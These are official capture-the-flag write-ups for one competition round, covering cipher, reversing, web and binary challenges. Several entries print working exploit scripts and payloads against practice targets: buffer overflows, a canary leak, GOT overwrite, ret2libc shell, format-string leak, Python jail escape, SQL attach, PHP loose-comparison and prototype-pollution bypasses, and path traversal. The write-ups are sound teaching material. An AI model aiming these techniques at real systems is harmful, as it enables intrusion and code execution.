# Round 9 Official Writeups

The following writeups were provided by the respective challenge authors

## Sanity Check Round 9

Get file, go to Youtube link, scroll to bottom of desc, copy and submit flag

## Rotations

This cipher is a modern twist on the Caesar cipher, with a rotation through ASCII characters. Rotate each character by a rotation of 47 to get `ictf{l3ts_st4rt_0ut_ez_w1th_s0me_r0t47!}`.  (https://gchq.github.io/CyberChef/#recipe=ROT47(47)&input=OjRFN0w9YkVEMERFY0NFMF9GRTA2SzBIYEU5MERfPjYwQ19FY2ZQTg)

## Salty

Upon inspection, we notice that the program simulates a bash shell, but if the input's hash, salted with "salt", matches a XOR encrypted string, the program will print out a link to a pastebin with the password being the password that makes the hash. Using Crackstation or another hash cracking tool, we find that the salted hash corresponds to "saltwater", and without the salt of "salt" the password becomes just "water". So, we enter that into the program, go to https://pastebin.com/vU76aJvC (the link the program gives), and enter in the password "water". We get the flag: ictf{s4lty_w4ter_1nd33d_4f285a3}

## ret2win

There are 2 `scanf()` functions in this binary, both susceptible to buffer overflow. First `scanf()` is directly accessible, but accessing the second one requires you to overwrite a value on the stack.
The first `scanf()` overflows very little and is not enough to reach the RIP.

```python
from pwn import *

binary = ELF('./ret2win', checksec=False)
p = binary.process()

win = binary.symbols['win']

offset = b'A' * 12
payload = offset + p64(0x1337c0d3)

p.sendline(payload)

payload2 = b'A' * 36 + p64(win)
p.sendline(payload2)

p.interactive()
```

## Camouflage

Use CyberChef randomize color palette(https://gchq.github.io/CyberChef/#recipe=Randomize_Colour_Palette('')), or use some tool to increase the contrast to a level that you can read the flag. Add "ictf" to the string and submit the flag!

## sources-adventure-hardened

Login page --> HTML hidden comments(Scroll down a lot) --> /robots.txt --> /classified_info --> employee panel --> rooYay2's resume --> HTML hidden comments --> rooYay2's employee panel --> cookies(crackstation, make sure to use the correct order lol) --> admin employee panel --> /payroll --> payroll.json --> construct flag using user ID's(in python append each dict's 'ID Code', reverse, concat.

## pyrev

The bytecode is fairly easy to read, we see a loop being setup over a constant list that's embedded in the disassembly.
The reconstructed code is:

```python
def f(n):
    for x in [0, 6, -17, 14, -21, 25, -23, 5, 15, 2, -12, 11, -1, 6, -4, -12, -6, 9, 8, 5, -3, -3, 6, -6, 4, -18, -6, 26, -2, -18, 20, -17, -9, -4]:
        n -= x
        print(chr(n), end="")
    print()
```

We can either simulate it ourselves, or reconstruct it, then knowing the flag format, simply pass in `ord("i")` as argument and read off the flag.

## ImaginaryBot v2

DM the bot, probably first with !help, and then after trying all the commands and getting nothing, spam !imaginary a bunch until you get an image. This image has flag.txt embedded in it, so I guess you can say the flag is in flag.txt lol

Bot Invite:  https://discord.com/oauth2/authorize?client_id=826994736182460436&permissions=0&scope=bot (no perms needed :rooCash: )

## ReDOS

Send an email of the regex form `.@(gmail){20,}.\.com`, which triggers the catastrophic backtracking in the regex, causing it to stall.

Sample payload: `asdf@gmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmailgmail.co`

## Optimal RSA

We're given all the parameters (the modulus is prime so no factoring needed), so it's not hard to decrypt. The only tricky thing are:

- The modulus is prime, so several tools (including RsaCtfTool) won't like that
- The encryption is not textbook RSA but OAEP (as hinted by the "optimal" in the title)

```python
from Crypto.Hash import SHA512
from Crypto.Cipher import PKCS1_OAEP

with open("output.txt", "r") as f:
    a, b, c = f.read().splitlines()
    N = int(a.split(" = ")[1])
    e = int(b.split(" = ")[1])
    ct = bytes.fromhex(c.split("'")[1])

class Key:
    def __init__(self, n, e):
        self.n = n
        self.e = e
        self.d = pow(e, -1, N - 1)
    def _decrypt(self, c):
        return pow(c, self.d, self.n)

c = PKCS1_OAEP.new(Key(N, e), SHA512)
print(c.decrypt(ct).decode())
```

## Blind Shell

Pipe command output (e.g. ls) into grep to check for presence/absence of characters. Then bruteforce character by character. 

```python
from pwn import *

alphabet = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!"#()+,-/:<=>?@[]^'

conn = remote('oreos.ctfchallenge.ga', '12345')
conn.sendline("cat flag.txt | grep ictf{")
conn.recvline()

flag = 'ictf{'

while True:
    for i in alphabet:
        test = flag + i
        print(test)
        conn.sendline("cat flag.txt | grep " + test)
        r = conn.recvline()
        print(r)
        print(chr(r[4]))
        if chr(r[4]) == 'S':
            flag = test
            break

    if flag[-1] == '}':
        break

print("Here's your flag: ", flag)
```

## Look-For-It

Path transversal. (this challenge may have been "simulated" path transversal though) http://lookforit.epizy.com/?page=../flag.txt

## Rotations of a different kind

Each individual byte is the result of a left-rotation by one more bit than the previous one (so byte i is rotated left by i bits, starting at 0). Easily undone, we can make some observations to determine what's happening by seeing that the first and last are both as expected in the flag format, and have a distance divisible by 8. ``` def rol(x, i): return ((x << i) (x >> (8 - i))) & 0xff print(bytes(rol(x, (8 - i) % 8) for i, x in enumerate(bytes.fromhex("69c6d133b72d9bb172cab52be68e5a3767beb12b668ed7396fe885a396ed9bb97d")))) ```

## Spacebar Smasher

INTENDED SOLUTION
The intended solution was to use the CETUS web extension (which could easily be found by searching up "Hack web assembly games") and modifying the value.

We will search for 0 first, and then break a spacebar, then search for 1, then break another, etc... until we get a single memory value which we can bookmark. (this method was on the tutorial on its GitHub page). Change the value on the bookmarks tab, and there's the flag!

UNINTENDED SOLUTION - Strings + grep (chopswiss + tirefire)
I specifically encoded the flag link in base64 so people couldn't guess it easily, but some people had troubles playing the game. They guessed base64, and strings'd the data file which you could get by viewing source, and then grepped for "==". They found the flag that way.

UNINTENDED SOLUTION - Automation
There was an (unintended) bug where if you click off the tab (like into your taskbar), the breaking animation stops. I am not sure if anyone used this method, but if you are fast enough, could be feasible.



## lookup-rev

[This should be a 50pts challenge, but I made it 75pts so that people don't just let it run infinitely after optimizing the primality check]
Firstly, the `is_prime()` function could be replaced by something more efficient, like from crypto.utils.number or from sagemath. It would still won't show the entire flag but now we have a sequence of valid `i`s. Googling that sequence would tell us that these are Woodall primes.
Now, we can replace the line(which generates sequence and checks for primality) with a `for loop` that goes through a lookup table of Woodall primes. (There is a list on oeis.org)

## The GOAT

When we decompile, we notice that the program lets us write a value to memory, then calls puts() on a string "OK. Thanks! I hope you dont pop any $(sh)ells!". The "$(sh)" seems suspicious, and it looks like bash. So, we run this in bash, and it lets us execute commands. (even though we can only see stderr) So, our goal is to call system() on this string. We overwrite the GOT to do this. For the address to write to, put in 4210712, the address of the GOT entry for puts(). For the address of system, we put 4198560, the address of system() in the PLT. Then, we have a shell, even though we cannot see the output of our commands. To circumvent this, we enter in "bash 1>&2" and we are now able to run commands and see their output. Run "cat flag.txt" to get the flag.

```python
from pwn import *

conn = remote("stephencurry.ctfchallenge.ga", 5001)
elf = ELF("./goat")

conn.recvuntil("?")
conn.sendline("4210712") # puts() GOT, in decimal form
conn.recvuntil("?")
conn.sendline("4198560") # system() PLT, in decimal form
conn.sendline("bash 1>&2")
conn.interactive()
```

## What's a database

We can attach the flag database into our own in-memory database and copy over the table into the `whatsthis` table the challenge needs:

```/db?script=ATTACH 'flag.db' AS f; CREATE TABLE whatsthis (flag VARCHAR(80) PRIMARY KEY); INSERT INTO whatsthis SELECT flag FROM f.flag;```

## Overlooked

Extract the zip, use zero-width steganography (https://330k.github.io/misc_tools/unicode_steganography.html with all boxes checked) decrypt on the text file to get the password `thisisthepasswordforthefilebutinzwspglhf`. Then use steghide to extract a zlib file out. Use zlib-flate to uncompress the file, to get the image with the flag.

## Little

Convert the endianness from little endian. Remove the padding at the end after the `}`.

## vnpack

The binary has been packed with UPX, but all occurences of `UPX!` have been replaced with `VPX!`, causing the binary not to run properly. This can be seen by looking at the strings in the binary (occuring both at the start and the end), and the challenge title helps a bit too. Fixing this allows us to just run it to obtain the flag.

```bash
#!/bin/bash
sed -i 's/VPX!/UPX!/g' ./vnpack
./vnpack
```

## Bland RSA

We see that the value for $e$ is extremely big. We might assume that the decryption exponent $d$ is not very large in this case, and that as such Wiener's attack or the attack of Boneh and Durfee applies.
This might work, but instead, upon further inspection, we observe that the ciphertext is in fact not encrypted at all.
As it turns out, $e = \lambda(N) + 1$, resulting in $m^e \equiv m \pmod N$.

## Form a String

Format string attack, spam "%p", and translate the hex output to ASCII. Then sequence "ictf..." and you got the flag.

```python
from pwn import *

elf = ELF('./pwn', checksec=False)
# p = elf.process()
p = remote('34.203.197.39', 3000)

# context.log_level = 'debug'
# gdb.attach(p, gdbscript='i f')

def print_flag_part(index):
    p.sendline(f'%{index}$p')
    flagpart = p.recvline().decode()[2:]
    print(bytearray.fromhex(flagpart).decode()[::-1], end='')

p.recvline()

for i in range(18, 23):
    print_flag_part(i)
```

## Minijail

From `print`, we can get to `__builtins__` via `print.__self__`. With this, a short exploit would consist of running `exec(input())`, but both of these require access to `__builtins__`.

Luckily, we appear to be running a modern python version, so we can use the walrus operator. This means we can assign `__builtins__` to a short variable name and use it in the same expression (e.g. a tuple or a list).

`[b:=print.__self__,b.exec(b.input())]` is exactly the length we need.

## canaries

```
from pwn import *

binary = ELF('./canaries', checksec=False)
# p = binary.process()
p = remote('stephencurry.ctfchallenge.ga', 5002)
# context.log_level = 'debug'

win = binary.symbols['win']
ret = 0x401016

fmtstr = b'%9$lx'

p.recvline()
p.sendline(fmtstr)
canary = b'0x' + p.recvline().split()[-1]
print(canary)

p.recvline()

payload = b'A'*24 + p64(int(canary, 16)) + b'B'*8 + p64(ret) + p64(win)
p.send(payload)

# gdb.attach(p, gdbscript='i f')
p.interactive()
```

## To be, or not to be

Read the figlet which translates ascii to ascii word art, and reply to the server 250 times with the correct value. The possible text is from https://en.wikipedia.org/wiki/To_be,_or_not_to_be.

```python
#!/usr/bin/env python

from pwn import *
from pyfiglet import Figlet

#this file has the words from the Wikipedia article
with open('hamletsoliloquy.txt') as f:
    lines = f.read()

f = Figlet()

tobeornottobe = {}
for line in lines.splitlines():
    for word in line.split(' '):
        tobeornottobe[f.renderText(word)] = word

r = remote('tirefire.org', 11051)
#r = remote('proud-silence-2495.fly.dev', 10051)

r.recvuntil(b's)\n')
while True:
    try:
        fig = r.recvuntil('\n\n').decode()[:-1]
    except:
        r.interactive()
    r.recvuntil(': ')
    if fig in tobeornottobe:
        r.sendline(tobeornottobe[fig])
    else:
        print(fig)
```

## Just in Time 1

Try times near the current time until one matches the given random number, then use that seed.

```python
from pwn import *
import time

conn = remote('oreos.ctfchallenge.ga', 7331)
conn.recvuntil(":")

base = round(time.time(), 2)
check = int(conn.recvline().decode())

for n in range(-1000,1000):
  random.seed(round(base+n/100,2))
  if random.randint(0, 1000000000) == check:
    break

conn.sendline(str(random.randint(0, 1000000000)))
conn.sendline(str(random.randint(0, 1000000000)))
conn.sendline(str(random.randint(0, 1000000000)))
print(conn.recvall().decode())
```

## Fake crypto

PHP is a weird language.
When you use `==` instead of `===` the comparison will often behave in a [strange way](https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/).
In this particular case, since we're generating string hashes in hex,
we're interested in strings that could be interpreted as integers.
For example when we compare `"0e12345" == 0` or even `"0e12345" == "0e54321"`,
these will evaluate to true, as the loose comparison first tries to interprete
the strings as numbers, and successfully does so, thinking they represent `0 * 10^x`.
With some brute force to search for md5 hashes of this form, we can fairly quickly
find a "collision".
This phenomenon is also known as a *magic* hash in PHP.

Cheese solution: `?a[]=0&b[]=1`

## When is it?

First run strings and notice the UPX string in there. When opened in GDB, we see no functions. This should only lead to the conclusion that this was packed with UPX. After installing and running the program, we are unable to decompress the program to access all the functions in this program. When opened in Ghidra we are able to see two functions at large: main and flag. When looked into the main function, we can see the password is "Password", however, this is not the case, confirmed by the strcmp with param1 set to "ZyphenIsBack". If we are able to do this, then only are we allowed to pass the function. Here on out, we can do this in two ways. One with ease, and the other with patience. The first way is with a package called `faketime`, by setting the date to a picture of the calendar we have. We are then able to travel through gdb, with the command `faketime '2007-03-16' gdb pwn`, and call the function "flag" with the correct password, with `call (void) flag("ZyphenIsBack")`. The second method of solving this will be to set breakpoints and jump past the if statements, also referenced with the jne's, then continue at the print statements.

## JSON, but not notation

We can notice that the hash that is checked is actually the binary inverse of a fake flag, so it's very unlikely this is a real hash, and we certainly couldn't extract the flag from it.

What we see instead, is that the `whatsThis` function allows us to do prototype pollution. By sending the body `__proto__.is_admin=whatever`, and because there's an obvious typo in the `GET` handler, we can pass the condition and get the flag.

Most of the trickery is involved in making sure that all sessions have an individual prototype, since otherwise a single solver would make the flag appear for everyone.

## Librarian

```python
#!/usr/bin/env python3

from pwn import *
import binascii

# we are given the binary
elf = ELF("./librarian")

# we leak libc with the below steps multiple times with different functions
# and then download it from https://libc.rip
libc = ELF('./libc.so.6')

# gadgets for args (it's 64 bit)
pop_rdi = 0x0000000000401443
ret = 0x000000000040101a

#conn = process("./librarian")
# connect to the server
conn = remote("stephencurry.ctfchallenge.ga", 5003)

# rand() is called without srand(), so our seed is 0.
# The password will always be the same
conn.sendline("1804289383")
conn.sendline("42") #some number that isn't 1-5 will trigger the error prompt

conn.recvuntil("to our library.")

# Time to leak a libc address!
payload = b'A'*568 # offset to the overflow var
payload += p64(pop_rdi) # rdi is for the first arg
payload += p64(elf.got['puts']) # first arg is the GOT entry of puts, points to puts in libc
payload += p64(elf.plt['puts']) # calls puts()
payload += p64(elf.symbols['main']) # calls main() after puts is run
conn.sendline(payload) # send this payload

# extra lines
conn.recvline()
conn.recvline()

# recieve our leak, accounting for endianness
puts_libc = int(binascii.hexlify(conn.recvline()[::-1]).replace(b'0a', b'').decode(), 16)

log.info("puts() libc: " + hex(puts_libc))

libc.address = puts_libc - libc.symbols['puts'] # find the libc base
bin_sh = next(libc.search(b"/bin/sh")) # find the address of /bin/sh in libc
system_libc = libc.symbols['system'] # find the address of system() in libc

log.info("libc base: " + hex(libc.address))
log.info("system(): " + hex(system_libc))
log.info("/bin/sh: " + hex(bin_sh))

conn.sendline("846930886") # second random number with seed 0
conn.sendline("42") # bring up the error / asking for feedback
conn.recvuntil("to our library.")

payload = b'A'*568
payload += p64(ret) # stack alignment :(
payload += p64(pop_rdi) # load first arg
payload += p64(bin_sh) # address of /bin/sh in libc
payload += p64(system_libc) # address of system() in libc
conn.sendline(payload)

conn.recvuntil("!")
conn.recvline()

log.info("You should have a shell now... ")
conn.interactive() # WE GET A SHELL!!!!!

```

## Ropsten

From the title and the category, we can deduce this challenge is about the ethereum blockchain,
and its ropsten testnet.
We use the address provided to locate a smart contract in the [etherscan explorer](https://ropsten.etherscan.io/address/0xb623e940215925ede9745dcd07950e912895facb).
There, we can try to decompile the bytecode, or simply read the verified source code that's provided there.

Reading that, we see that function named `xorme` that takes an input, checks it and gives an output.
Xoring the correct input with the output together gives us the flag.
